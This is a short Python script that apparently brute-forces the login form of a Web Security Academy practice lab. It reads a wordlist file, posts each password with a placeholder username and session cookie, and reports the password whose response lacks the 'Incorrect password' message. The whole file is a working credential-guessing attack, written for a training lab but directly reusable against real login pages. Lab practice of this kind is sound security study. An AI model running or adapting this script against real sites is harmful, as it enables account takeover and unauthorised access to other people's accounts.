import requests

url = "https://0add009103b6c6e280ceefdf00d400e7.web-security-academy.net/login"

cookies = {
	"session": "YOUR_SESSION"
}

headers = {
	"Origin": "https://0add009103b6c6e280ceefdf00d400e7.web-security-academy.net",
	"Referer": "https://0add009103b6c6e280ceefdf00d400e7.web-security-academy.net/login"
}


with open("passwords", "r") as file:
	passwords = file.read().splitlines()

for password in passwords:
	data = {
		"username": "VALID_USERNAME",
		"password": password
	}

	response = requests.post(url, cookies=cookies, headers=headers, data=data)

	if 'Incorrect password' in response.text:
		continue
	else:
		print(f'Valid Password: {password}')
